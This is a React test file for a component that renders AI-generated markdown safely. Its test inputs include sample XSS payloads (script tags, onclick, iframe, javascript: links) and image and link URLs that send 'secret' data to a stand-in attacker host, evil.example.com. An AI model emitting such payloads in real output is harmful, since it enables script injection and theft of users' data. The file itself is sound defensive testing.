// Copyright (c) 2024-2026 EVtivity. All rights reserved.
// SPDX-License-Identifier: BUSL-1.1

import { afterEach, describe, it, expect, vi } from 'vitest';
import { cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';

vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (key: string) => key }),
}));
vi.mock('@/lib/config', () => ({ PORTAL_BASE_URL: 'https://portal.example.com' }));

import { AiMarkdown } from '../AiMarkdown';

afterEach(cleanup);

describe('AiMarkdown', () => {
  it('renders GitHub-flavored markdown tables inside a scroll wrapper', () => {
    render(<AiMarkdown content={'| Site | kWh |\n|---|---|\n| North | 12 |'} />);
    const table = screen.getByRole('table');
    expect(table.parentElement?.className).toContain('overflow-x-auto');
    expect(screen.getByRole('cell', { name: 'North' })).toBeTruthy();
  });

  it('TC-AI-M-01: does not render raw HTML', () => {
    const { container } = render(
      <AiMarkdown
        content={
          'Hello <script>alert(1)</script><b onclick="x()">bold</b> <iframe src="https://evil.example.com"></iframe>'
        }
      />,
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
    expect(container.querySelector('iframe')).toBeNull();
    expect(container.querySelector('[onclick]')).toBeNull();
  });

  it('TC-AI-M-02: javascript:, data: and off-allowlist links render as text', () => {
    render(
      <AiMarkdown
        content={
          '[a](javascript:alert(1)) [b](data:text/html,x) [c](https://evil.example.com/?q=secret) [d](http://evtivity.com/docs)'
        }
      />,
    );
    expect(screen.queryAllByRole('link')).toHaveLength(0);
    expect(screen.getByText('c')).toBeTruthy();
  });

  it('TC-AI-M-03: allowlisted links open in a new tab with noopener noreferrer', () => {
    render(
      <AiMarkdown content="[docs](https://evtivity.com/en/docs/csms) [portal](https://portal.example.com/sessions)" />,
    );
    for (const name of ['docs', 'portal']) {
      const link = screen.getByRole('link', { name });
      expect(link.getAttribute('target')).toBe('_blank');
      expect(link.getAttribute('rel')).toBe('noopener noreferrer');
    }
  });

  it('TC-AI-M-04 / TC-AI-I-04: images become chips and are never loaded', () => {
    const { container } = render(
      <AiMarkdown
        content={
          '![leak](https://evil.example.com/x.png?d=secret) ![docs shot](https://evtivity.com/a.png)'
        }
      />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByText('leak').closest('a')).toBeNull();
    expect(screen.getByRole('link', { name: 'docs shot' }).getAttribute('href')).toBe(
      'https://evtivity.com/a.png',
    );
  });

  it('TC-AI-M-05: code blocks have a copy button that copies the code', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    render(<AiMarkdown content={'```json\n{"a": 1}\n```'} />);
    expect(screen.getByText('json')).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'ai.copyCode' }));
    await waitFor(() => {
      expect(writeText).toHaveBeenCalledWith('{"a": 1}');
    });
    expect(await screen.findByRole('button', { name: 'ai.copied' })).toBeTruthy();
  });
});
